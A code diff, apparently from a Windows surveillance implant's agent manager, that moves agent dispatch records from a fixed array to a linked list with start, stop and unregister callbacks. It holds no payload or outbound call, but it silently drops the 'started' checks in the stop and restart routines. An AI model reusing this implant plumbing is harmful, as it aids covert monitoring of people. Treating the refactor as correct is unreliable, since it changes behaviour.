@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
 #include <config.h>
+#include <rcs/list.h>
 #include "common.h"
 #include "H4-DLL.h"
 #include "AM_Core.h"
@@ -68,6 +69,7 @@ typedef DWORD (WINAPI *PMU_Generic_t) (void); // Prototipo per l'UnRegister
 #define AGENT_NAME_LENGTH 32
 
 typedef struct _amdispatch {
+	LIST_ENTRY entry;
 	CHAR agent_name[AGENT_NAME_LENGTH];
 	DWORD agent_tag;
 	PMD_Generic_t pDispatch; 
@@ -77,36 +79,34 @@ typedef struct _amdispatch {
 	BOOL started;
 } AMDISPATCH, *LPAMDISPATCH;
 
-static AMDISPATCH aDispatchArray[AM_MAXDISPATCH];
-static DWORD dwDispatchCnt = 0;
+static LIST_ENTRY aDispatchArray = { &aDispatchArray, &aDispatchArray };
 
 static LPAMDISPATCH AllocateDispatchElement()
 {
-	if (dwDispatchCnt >= AM_MAXDISPATCH)
-		return NULL;
+	LPAMDISPATCH dst = alloc_entry<AMDISPATCH>();
 
-	LPAMDISPATCH dst = &aDispatchArray[dwDispatchCnt];
-	dwDispatchCnt++;
+	InsertTailList(&aDispatchArray, &dst->entry);
 	return dst;
 }
 
+
+static BOOL compare_by_tag(LPAMDISPATCH entry, DWORD key)
+{
+	return (entry->agent_tag == key);
+}
+
+static BOOL compare_by_name(LPAMDISPATCH entry, LPCSTR lpName)
+{
+	return !stricmp(entry->agent_name, lpName);
+}
 static LPAMDISPATCH GetDispatchByTag(DWORD dwTag)
 {
-	for (DWORD i = 0; i < dwDispatchCnt; i++) {
-		if (dwTag == aDispatchArray[i].agent_tag)
-			return &aDispatchArray[i];
-	}
-	return NULL;
+	return find_entry_in_list<AMDISPATCH>(&aDispatchArray, compare_by_tag, dwTag);
 }
 
 static LPAMDISPATCH GetDispatchByName(LPCSTR lpName)
 {
-	for (DWORD i = 0; i < dwDispatchCnt; i++) {
-		if (!stricmp(lpName, aDispatchArray[i].agent_name))
-			return &aDispatchArray[i];
-	}
-
-	return NULL;
+	return find_entry_in_list<AMDISPATCH>(&aDispatchArray, compare_by_name, lpName);
 }
 
 ////////////////////////////////////////////////
@@ -350,20 +350,36 @@ DWORD AM_MonitorInit(DWORD dwTag, cJSON* elem)
 	return 1;
 }
 
+static void stop_everything(LPAMDISPATCH entry)
+{
+	if (entry->pStartStop != NULL)
+		entry->pStartStop(FALSE, TRUE);
+}
+
+static void suspend_everything(LPAMDISPATCH entry)
+{
+	if (entry->pStartStop != NULL)
+		entry->pStartStop(FALSE, FALSE);
+}
+
+static void restart_everything(LPAMDISPATCH entry)
+{
+	if (entry->pStartStop != NULL)
+		entry->pStartStop(TRUE, FALSE);
+}
+
+static void unregister(LPAMDISPATCH entry)
+{
+	if (entry->pUnRegister)
+		entry->pUnRegister();
+}
+
 // Stoppa e Deregistra tutti gli agenti prima dell'uninstall
 DWORD AM_UnRegisterAll()
 {
-	DWORD i;
-
-	for(i=0; i<dwDispatchCnt; i++) {
-		if (aDispatchArray[i].pStartStop)
-			aDispatchArray[i].pStartStop(FALSE, TRUE);
-	}
-
-	for(i=0; i<dwDispatchCnt; i++) {
-		if (aDispatchArray[i].pUnRegister)
-			aDispatchArray[i].pUnRegister();
-	}
+	apply_in_list<AMDISPATCH>(&aDispatchArray, stop_everything);
+	apply_in_list<AMDISPATCH> (&aDispatchArray, unregister);
+	remove_all<AMDISPATCH>(&aDispatchArray, free);
 	return 1;
 }
 
@@ -373,40 +389,24 @@ DWORD AM_UnRegisterAll()
 // o come action di un evento o con la ResartAll
 DWORD AM_MonitorSuspendAll()
 {
-	DWORD i;
-
-	for(i=0; i<dwDispatchCnt; i++) {
-		if (aDispatchArray[i].pStartStop)
-			aDispatchArray[i].pStartStop(FALSE, FALSE);
-	}
+	apply_in_list<AMDISPATCH>(&aDispatchArray, suspend_everything);
 	return 1;
 }
 
 DWORD AM_MonitorStopAll()
 {
-	DWORD i;
-
-	for(i=0; i<dwDispatchCnt; i++) {
-		aDispatchArray[i].started = FALSE;
-		if (aDispatchArray[i].pStartStop)
-			aDispatchArray[i].pStartStop(FALSE, TRUE);
-	}
+	apply_in_list<AMDISPATCH>(&aDispatchArray, stop_everything);
 	return 1;
 }
 
 // Rimette gli agent nello stato in cui erano al momento
 // della SuspendAll (usato quando c'e' una sync e uno scambio
 // di code dei log).
+// Li riavvia in ordine inverso allo stop
+// Gli ultimi agenti registrati rimangono stoppati per meno tempo
 DWORD AM_MonitorRestartAll()
 {
-	int i;
-
-	// Li riavvia in ordine inverso allo stop
-	// Gli ultimi agenti registrati rimangono stoppati per meno tempo
-	for(i=dwDispatchCnt-1; i>=0; i--) {
-		if (aDispatchArray[i].pStartStop && aDispatchArray[i].started)
-			aDispatchArray[i].pStartStop(TRUE, FALSE);
-	}
+	reverse_apply_in_list<AMDISPATCH>(&aDispatchArray, restart_everything);
 	return 1;
 
 }
